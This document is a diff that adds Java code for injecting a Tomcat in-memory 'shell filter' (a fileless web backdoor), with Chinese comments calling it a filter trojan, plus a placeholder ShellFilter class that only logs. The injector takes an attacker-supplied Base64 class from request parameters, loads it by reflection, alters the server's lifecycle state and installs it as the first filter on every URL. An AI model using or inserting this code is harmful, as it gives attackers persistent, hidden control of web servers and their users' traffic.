@@ -1,0 +1,95 @@
+
+        ServletContext servletContext = getServletContext();
+        HttpServletRequest httpRequest = getHttpRequest();
+        String filterName = httpRequest.getParameter("filterName");
+        String filterClz = httpRequest.getParameter("filterClz");
+        if (filterName == null || filterClz == null || filterName.isEmpty() || filterClz.isEmpty()){
+            return;
+        }
+        try {
+            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass",
+                    String.class, byte[].class, int.class, int.class);
+            defineClass.setAccessible(true);
+            byte[] codes = Base64.getDecoder().decode(filterClz);
+            Class expClazz = (Class) defineClass.invoke(ClassLoader.getSystemClassLoader(),
+                    filterName, codes, 0, codes.length);
+
+            Filter shellFilter = (Filter) expClazz.newInstance();
+            org.apache.catalina.core.StandardContext standardContext = null;
+           if (servletContext.getFilterRegistration(filterClz) == null){
+               for (; standardContext == null; ) {
+                   java.lang.reflect.Field contextField = servletContext.getClass().getDeclaredField("context");
+                   contextField.setAccessible(true);
+                   Object o = contextField.get(servletContext);
+                   if (o instanceof javax.servlet.ServletContext) {
+                       servletContext = (javax.servlet.ServletContext) o;
+                   } else if (o instanceof org.apache.catalina.core.StandardContext) {
+                       standardContext = (org.apache.catalina.core.StandardContext) o;
+                   }
+               }
+               if (standardContext != null) {
+                   //修改状态，要不然添加不了
+                   java.lang.reflect.Field stateField = org.apache.catalina.util.LifecycleBase.class
+                           .getDeclaredField("state");
+                   stateField.setAccessible(true);
+                   stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTING_PREP);
+
+                   //添加filter马
+                   javax.servlet.FilterRegistration.Dynamic filterRegistration = servletContext
+                           .addFilter(filterName, shellFilter);
+                   filterRegistration.setInitParameter("encoding", "utf-8");
+                   filterRegistration.setAsyncSupported(false);
+                   filterRegistration
+                           .addMappingForUrlPatterns(java.util.EnumSet.of(javax.servlet.DispatcherType.REQUEST), false,
+                                   new String[]{"/*"});
+                   //状态恢复，要不然服务不可用
+                   stateField.set(standardContext, org.apache.catalina.LifecycleState.STARTED);
+
+                   //生效filter
+                   Method filterStartMethod = org.apache.catalina.core.StandardContext.class
+                           .getMethod("filterStart");
+                   filterStartMethod.setAccessible(true);
+                   filterStartMethod.invoke(standardContext, null);
+
+                   //把filter插到第一位
+                   org.apache.tomcat.util.descriptor.web.FilterMap[] filterMaps = standardContext
+                           .findFilterMaps();
+                   for (int i = 0; i < filterMaps.length; i++) {
+                       if (filterMaps[i].getFilterName().equalsIgnoreCase(filterName)) {
+                           org.apache.tomcat.util.descriptor.web.FilterMap filterMap = filterMaps[i];
+                           filterMaps[i] = filterMaps[0];
+                           filterMaps[0] = filterMap;
+                           break;
+                       }
+                   }
+               }
+           }
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        
+        
+
+
+import javax.servlet.*;
+import java.io.IOException;
+
+public class ShellFilter implements Filter {
+    @Override
+    public void init(FilterConfig filterConfig) throws ServletException {
+        System.out.println("[ShellFilter] init()...");
+    }
+
+    @Override
+    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
+        System.out.println("[ShellFilter] before filterChain.doFilter()...");
+        filterChain.doFilter(servletRequest, servletResponse);
+        System.out.println("[ShellFilter] after filterChain.doFilter()...");
+    }
+
+    @Override
+    public void destroy() {
+        System.out.println("[ShellFilter] destroy()...");
+    }
+}
